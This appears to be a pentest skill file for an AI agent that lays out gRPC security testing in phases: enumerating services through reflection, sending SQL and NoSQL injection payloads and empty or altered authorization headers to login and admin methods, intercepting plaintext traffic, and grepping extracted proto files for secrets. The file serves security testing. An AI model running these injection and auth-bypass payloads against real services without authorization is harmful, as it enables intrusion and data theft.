---
name: vuln-grpc
description: "gRPC security testing — service enumeration via reflection, proto file analysis, injection via gRPC methods, authentication bypass, plaintext gRPC interception. Triggers: 'grpc', 'grpc security', 'grpc pentest', 'protobuf injection', 'grpc reflection', 'grpc exploit', 'grpc auth bypass', 'protocol buffer', 'h2 grpc'."
---

# gRPC Security Testing

Enumerate and test gRPC services for injection, auth bypass, and insecure reflection.

---

## Phase 1: Service Discovery

```bash
TARGET="grpc.TARGET:443"  # or host:port
TARGET_HTTP="https://TARGET"

go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest 2>/dev/null
# Or: brew install grpcurl

grpcurl -insecure "$TARGET" list 2>&1 | tee output/grpc_services.txt

while IFS= read -r SERVICE; do
  echo "=== $SERVICE ==="
  grpcurl -insecure "$TARGET" list "$SERVICE"
done < output/grpc_services.txt | tee output/grpc_methods.txt

SERVICE="com.example.UserService"
METHOD="GetUser"
grpcurl -insecure "$TARGET" describe "${SERVICE}.${METHOD}"

COMMON_SERVICES=("grpc.reflection.v1alpha.ServerReflection" "grpc.health.v1.Health" "UserService" "AuthService" "OrderService")
for SVC in "${COMMON_SERVICES[@]}"; do
  grpcurl -insecure "$TARGET" list "$SVC" 2>/dev/null && echo "FOUND: $SVC"
done
```

---

## Phase 2: Method Enumeration & Probing

```bash
TARGET="grpc.TARGET:443"

grpcurl -insecure "$TARGET" \
  com.example.UserService/GetAllUsers 2>&1

grpcurl -insecure -d '{"user_id": 1}' "$TARGET" \
  com.example.UserService/GetUser 2>&1

grpcurl -insecure -d '{"user_id": "1 OR 1=1--"}' "$TARGET" \
  com.example.UserService/GetUser 2>&1

grpcurl -insecure -d '{"username": {"$ne": ""}}' "$TARGET" \
  com.example.AuthService/Login 2>&1

grpcurl -insecure -rpc-header "authorization: " "$TARGET" \
  com.example.AdminService/GetConfig 2>&1

grpcurl -insecure -rpc-header "authorization: Bearer MODIFIED_JWT" "$TARGET" \
  com.example.AdminService/GetConfig 2>&1
```

---

## Phase 3: Interception (Plaintext)

```bash
TARGET="grpc.TARGET:50051"  # plaintext gRPC

mitmproxy --mode transparent -p 8080 --scripts grpc_intercept.py &

go run github.com/mwitkow/grpc-proxy/... &

nmap -p 50051 TARGET --script grpc-discover 2>/dev/null
curl -s -H "Content-Type: application/grpc" "http://TARGET:50051/" -v 2>&1
```

---

## Phase 4: Proto File Extraction

```bash
TARGET="grpc.TARGET:443"

git clone https://github.com/grpc-ecosystem/grpc-gateway 2>/dev/null

grpcurl -insecure "$TARGET" describe 2>&1 > output/grpc_proto.txt

grep -iE "password|token|secret|key|auth|admin" output/grpc_proto.txt
```

---

## Output

Save to `output/`:
- `grpc_services.txt` — discovered gRPC services
- `grpc_methods.txt` — available methods per service
- `grpc_proto.txt` — extracted proto definitions

## Next Phase

→ `vuln-api-testing` for broader API security testing
→ `pentest-report` to document findings
